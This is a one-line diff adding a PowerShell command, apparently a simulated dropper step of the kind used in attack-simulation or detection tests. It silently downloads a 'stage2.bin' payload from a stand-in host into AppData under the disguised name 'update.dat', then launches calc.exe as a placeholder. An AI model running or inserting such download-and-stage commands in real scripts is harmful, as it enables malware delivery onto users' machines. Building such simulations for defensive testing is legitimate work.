@@ -1,0 +1,1 @@
+$TransferUrl = "http://contoso.com/cdn/stage2.bin"; $DownloadPath = "$env:APPDATA\update.dat"; curl.exe -s -L -o $DownloadPath $TransferUrl; & 'calc.exe'; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
